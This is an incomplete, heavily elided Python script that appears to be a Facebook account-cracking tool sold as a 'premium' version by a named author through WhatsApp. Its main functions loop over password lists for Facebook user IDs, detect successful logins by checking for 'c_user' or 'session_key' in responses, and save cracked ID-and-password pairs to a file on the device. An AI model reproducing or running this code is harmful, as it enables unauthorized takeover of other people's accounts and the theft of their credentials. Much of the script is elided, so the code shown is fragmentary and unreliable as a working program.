...
\033[1;36m╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║
 \033[1;37m╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
  ...
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : MOHAMMAD UMAR
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join UMAR Group ")
      print('Copy Key and send UMAR Owner')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/groups/6056083047810129/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/groups/6056083047810129/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/groups/6056083047810129/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        ...
                        print(f" \033[1;97mYour Key : {UMARPREMIUM400}")
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923152083002&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi UMAR Sir, I Need To Buy Your Paid UMAR PRO Tools Version 1.0.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+UMARPREMIUM400)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in UMAR:
                                ...
                                if 'y' in pcp:
                                        print('\r\033[1;97m UMAR-CP '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mUMAR-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/UMAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m UMAR-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/UMAR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mUMAR-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/UMAR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
